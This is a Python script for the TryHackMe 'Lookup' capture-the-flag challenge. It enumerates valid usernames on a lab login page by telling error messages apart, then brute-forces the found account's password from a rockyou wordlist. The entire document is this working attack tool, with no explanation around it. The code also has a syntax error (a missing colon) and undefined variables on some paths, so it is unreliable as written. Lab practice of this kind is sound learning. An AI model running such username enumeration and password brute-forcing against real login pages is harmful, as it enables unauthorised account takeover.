# A script to enumerate users in the Lookup Challenge on THM

#!/bin/python3
import requests
import sys

password_test="test"
url="http://lookup.thm/login.php"
error_message = "Wrong password. Please try again.<br>Redirecting in 3 seconds."

with open('/usr/share/seclists/Usernames/Names/names.txt', 'r') as file:
    usernames = [file.readline().strip() for _ in range(5000)]

with open('/home/blackarch/Documents/rockyou.txt', 'r') as file:
    password_list = [file.readline().strip() for _ in range(5000)]

def enumerate_usernames(url, username, password):
    for name in usernames:
        payload = {"username": name, "password": password_test }
        response = requests.post(url, data=payload)
        response_body = response.text 
        if "Wrong password. Please try again." in response_body and name != "admin":
            print("found a valid username", name)
            global final_username
            final_username = name
            break
        else :
            print(name, "is not a valid username")
            continue

enumerate_usernames(url, "", password_test)

choice = input("do you now want to brute-force it? yes/no")
if choice == "yes" :
    for pwd in password_list:
        payload_2 = {"username": final_username, "password": pwd }
        response = requests.post(url, data=payload_2)
        response_2_body = response.text 
        if error_message not in response_2_body
            print("found a valid password", pwd)
            final_pwd = pwd
            break
        else :
            print(pwd, "is not a valid password")
            continue

else: 
    print("bye")

print(final_username, ":" ,final_pwd)
